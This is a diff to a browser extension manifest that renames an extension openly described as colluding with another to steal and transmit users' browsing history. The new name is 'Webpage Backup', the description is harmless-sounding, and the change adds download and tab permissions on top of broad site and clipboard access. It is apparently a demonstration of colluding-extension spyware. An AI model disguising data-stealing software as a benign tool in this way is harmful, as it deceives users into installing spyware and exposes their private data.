@@ -1,9 +1,20 @@
 {
     "manifest_version": 2,
 
-    "name": "Extension 2 - Steal Yo History Foo'",
-    "description": "This extension colludes with the other extension you installed to steal and transmit your history data to our server",
-    "version": "1.0",
+    "name": "Webpage Backup",
+    "description": "Webpage Backup is the easiest, most convenient way to make sure you never lose access to a great webpage.",
+    "version": "1.1",
+
+    "icons" : {
+      "16": "icon16.png",
+      "48": "icon48.png",
+      "128": "icon128.png"
+    },
+
+    "browser_action": {
+      "default_icon": "icon_w.png",
+      "default_title": "Click Here to Save!"
+    },
 
     "background": {
       "page": "background.html"
@@ -12,6 +23,8 @@
       "http://localhost/",
       "http://*/*",
       "clipboardWrite",
-      "clipboardRead"
+      "clipboardRead",
+      "downloads",
+      "activeTab"
     ]
 }
